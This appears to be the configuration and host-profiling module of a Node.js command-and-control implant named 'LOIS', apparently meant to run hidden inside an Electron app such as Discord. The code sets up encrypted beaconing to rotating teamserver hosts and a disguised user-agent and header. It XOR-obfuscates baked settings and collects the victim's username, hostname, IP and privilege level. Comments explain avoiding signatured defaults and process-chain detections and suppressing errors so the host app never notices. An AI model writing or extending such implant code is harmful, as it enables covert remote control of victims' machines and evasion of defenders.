// config.js — LOIS agent configuration + host info.
// Precedence: env > sidecar file > baked (build-time) > defaults.
// Transport fields mirror beacon_listener_http's TransportConfig.
const fs = require('fs');
const path = require('path');
const os = require('os');

const DEFAULTS = {
  // transport
  host: '127.0.0.1', port: 443, ssl: false,
  hosts: [],            // ["h1:443","h2:443"] — endpoints, override host/port
  rotation: 'sequential', // or 'random'
  http_method: 'POST',
  uri: '/content.html',
  user_agent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
  hb_header: 'X-Request-Id',           // listener "ParameterName" (stock default X-Beacon-Id is signatured — never ship it)
  encrypt_key: '00112233445566778899aabbccddeeff', // 16B RC4, hex
  // response template: the listener splices RC4(taskstream) raw where the
  // marker sits in WebPageOutput (pl_transport.go: <<<PAYLOAD_DATA>>>)
  resp_template: '{"status": "ok", "data": "<<<PAYLOAD_DATA>>>","metrics": "sync"}',
  // timing
  sleep_delay: 5, jitter_delay: 15,   // seconds / percent
  file_chunk_size: 0x80000,           // download chunk (profile chunksize)
  // noise
  debug: false,
  // identity
  agent_type: 0x5f3a91c2,             // beacon watermark on OUR patched teamserver
                                      // (upstream stock: 0xbe4c0149 — overridden per op)
  agent_id: 'auto',                   // hex string -> stable session; 'auto' = random
  session_key: null,                  // 32 hex; fixed ids reuse ONE key (server never re-learns)
  // display overrides
  computer_name: null, domain_name: null, process_name: null,
};

function load() {
  const cfg = { ...DEFAULTS };
  const bakedRaw = typeof globalThis !== 'undefined' ? globalThis.__LOIS_BAKED__ : null;
  if (bakedRaw) {
    // encrypted bake (--enc-strings, default for baked builds): {d,k1,k2} —
    // XOR code-unit table, key split so no single key literal sits in the file
    if (typeof bakedRaw === 'object' && Array.isArray(bakedRaw.d)) {
      const k = bakedRaw.k1.concat(bakedRaw.k2);
      let s = '';
      for (let i = 0; i < bakedRaw.d.length; i++) s += String.fromCharCode(bakedRaw.d[i] ^ k[i % k.length]);
      try { Object.assign(cfg, JSON.parse(s)); } catch (_) {}
    } else Object.assign(cfg, bakedRaw); // plain object: dev/tests
  }

  let loadedFile = null;
  const sidecars = [
    process.env.LOIS_CONFIG,
    path.join(__dirname, 'lois.config.json'),
  ].filter(Boolean);
  for (const p of sidecars) {
    if (fs.existsSync(p)) {
      try { Object.assign(cfg, JSON.parse(fs.readFileSync(p, 'utf8'))); loadedFile = p; } catch (_) {}
      break;
    }
  }
  cfg.__file = loadedFile;
  cfg.agent_id_explicit = cfg.agent_id !== 'auto';

  const E = process.env;
  if (E.LOIS_HOST) cfg.host = E.LOIS_HOST;
  if (E.LOIS_PORT) cfg.port = parseInt(E.LOIS_PORT, 10);
  if (E.LOIS_SSL !== undefined) cfg.ssl = E.LOIS_SSL === '1' || E.LOIS_SSL === 'true';
  if (E.LOIS_KEY) cfg.encrypt_key = E.LOIS_KEY;
  if (E.LOIS_SLEEP) cfg.sleep_delay = parseInt(E.LOIS_SLEEP, 10);
  if (E.LOIS_JITTER) cfg.jitter_delay = parseInt(E.LOIS_JITTER, 10);
  if (E.LOIS_URI) cfg.uri = E.LOIS_URI;
  if (E.LOIS_HB_HEADER) cfg.hb_header = E.LOIS_HB_HEADER;
  if (E.LOIS_USER_AGENT) cfg.user_agent = E.LOIS_USER_AGENT;
  if (E.LOIS_METHOD) cfg.http_method = E.LOIS_METHOD;
  if (E.LOIS_DEBUG === '1') cfg.debug = true;
  if (E.LOIS_HOSTS) cfg.hosts = String(E.LOIS_HOSTS).split(',').map((s) => s.trim()).filter(Boolean);

  // endpoints
  cfg.endpoints = [];
  for (const h of cfg.hosts || []) {
    const m = String(h).match(/^(.+):(\d+)$/);
    if (m) cfg.endpoints.push({ host: m[1], port: parseInt(m[2], 10) });
  }
  if (!cfg.endpoints.length) cfg.endpoints = [{ host: cfg.host, port: cfg.port }];
  if (cfg.rotation !== 'random') cfg.rotation = 'sequential';

  // response template -> pre/post splice markers
  const t = String(cfg.resp_template);
  const marker = t.indexOf('<<<PAYLOAD_DATA>>>');
  if (marker < 0) throw new Error('resp_template missing <<<PAYLOAD_DATA>>> marker');
  cfg.resp_pre = t.slice(0, marker);
  cfg.resp_post = t.slice(marker + '<<<PAYLOAD_DATA>>>'.length);

  if (!/^[0-9a-fA-F]{32}$/.test(cfg.encrypt_key)) throw new Error('encrypt_key must be 32 hex chars');
  if (cfg.session_key !== null && !/^[0-9a-fA-F]{32}$/.test(cfg.session_key || '')) cfg.session_key = null;
  if (cfg.agent_id === 'auto') {
    cfg.agent_id = ((Math.floor(Math.random() * 0xffff) << 16) | Math.floor(Math.random() * 0x10000)) >>> 0;
  } else if (typeof cfg.agent_id !== 'number') {
    cfg.agent_id = parseInt(cfg.agent_id, 16) >>> 0;
  }
  return cfg;
}

// host metadata for the registration beat (AgentInfo.cpp equivalent)
let _elevCache = null;
function hostInfo(cfg) {
  let relStr = '0.0.0';
  try { relStr = os.release() || '0.0.0'; } catch (_) {}
  const rel = relStr.split('.').map((n) => parseInt(n, 10) || 0);
  let major = rel[0] || 10, minor = rel[1] || 0, build = rel[2] || 0;

  let internal_ip = 0;
  try {
    for (const name of Object.keys(os.networkInterfaces())) {
      for (const a of os.networkInterfaces()[name]) {
        if (a.family === 'IPv4' && !a.internal) { internal_ip = ipToLong(a.address); break; }
      }
      if (internal_ip) break;
    }
  } catch (_) {} // odd NIC states must never kill the host app (003)

  // elevation is process-static. Deliberately NO `net session` probe: a
  // child-process spawn under an Electron host is a process-chain IoA
  // (ticket 001). win32 defaults to false; an operator who knows better can
  // set "elevated": true in the baked/sidecar config.
  if (_elevCache === null) {
    if (typeof cfg.elevated === 'boolean') _elevCache = cfg.elevated;
    else if (process.platform !== 'win32' && typeof process.getuid === 'function') {
      try { _elevCache = process.getuid() === 0; } catch (_) { _elevCache = false; }
    } else _elevCache = false;
  }

  const arch64 = os.arch().includes('64');
  // identity probes can throw on odd hosts (deleted user, no hostname) —
  // contain everything; the host app must never see an exception (003)
  let username = '', hostname = '';
  try { username = os.userInfo().username; } catch (_) {}
  try { hostname = os.hostname(); } catch (_) {}
  let osType = '';
  try { osType = os.type(); } catch (_) {}
  return {
    major_version: major, minor_version: minor, build_number: build,
    internal_ip,
    gmt_offset: -Math.round(new Date().getTimezoneOffset() / 60),
    acp: 1252, oemcp: 437,
    pid: process.pid, tid: 0,
    is_server: false, elevated: _elevCache, sys64: arch64, arch64,
    domain_name: cfg.domain_name || (process.platform === 'win32' ? (process.env.USERDOMAIN || hostname) : osType),
    computer_name: cfg.computer_name || hostname,
    username,
    // inside Electron, execPath is the host app (Discord.exe) — exactly what
    // the C++ beacon reports for itself
    process_name: cfg.process_name || path.basename(process.execPath),
  };
}

function ipToLong(ip) {
  const p = ip.split('.').map((n) => parseInt(n, 10) & 0xff);
  return (((p[0] << 24) | (p[1] << 16) | (p[2] << 8) | p[3]) >>> 0);
}
module.exports = { load, hostInfo, DEFAULTS };
